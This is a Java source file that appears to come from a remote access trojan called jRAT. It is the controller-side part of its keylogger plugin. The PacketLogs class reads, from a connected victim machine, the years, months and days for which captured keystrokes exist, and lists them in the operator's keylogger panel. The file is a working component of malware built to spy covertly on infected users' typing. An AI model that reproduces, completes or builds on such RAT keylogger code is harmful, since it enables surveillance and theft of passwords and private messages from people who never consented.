
package jrat.plugin.keylogger.client;

import javax.swing.tree.DefaultMutableTreeNode;

import jrat.api.Client;
import jrat.api.net.PacketListener;
import jrat.plugin.keylogger.client.ui.DayTreeNode;
import jrat.plugin.keylogger.client.ui.MonthTreeNode;
import jrat.plugin.keylogger.client.ui.PanelKeylogger;
import jrat.plugin.keylogger.client.ui.YearTreeNode;

public class PacketLogs extends PacketListener {

	@Override
	public void perform(Client client) {
		try {
			PanelKeylogger panel = (PanelKeylogger) KeyloggerPlugin.entry.get(client);
			
			panel.getRoot().removeAllChildren();
			
			int years = client.getDataInputStream().readInt();
			
			for (int i = 0; i < years; i++) {
				DefaultMutableTreeNode year = new YearTreeNode(client.getDataInputStream().readUTF());
				panel.getRoot().insert(year, 0);
				
				int months = client.getDataInputStream().readInt();
				
				for (int l = 0; l < months; l++) {
					DefaultMutableTreeNode month = new MonthTreeNode(client.getDataInputStream().readUTF());

					year.insert(month, 0);
					
					int days = client.getDataInputStream().readInt();
					for (int m = 0; m < days; m++) {
						DefaultMutableTreeNode day = new DayTreeNode(client.getDataInputStream().readUTF());

						month.insert(day, 0);
					}
				}
			}
			
			for (int i = 0; i < panel.getTree().getRowCount(); i++) {
				panel.getTree().expandRow(i);
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

}
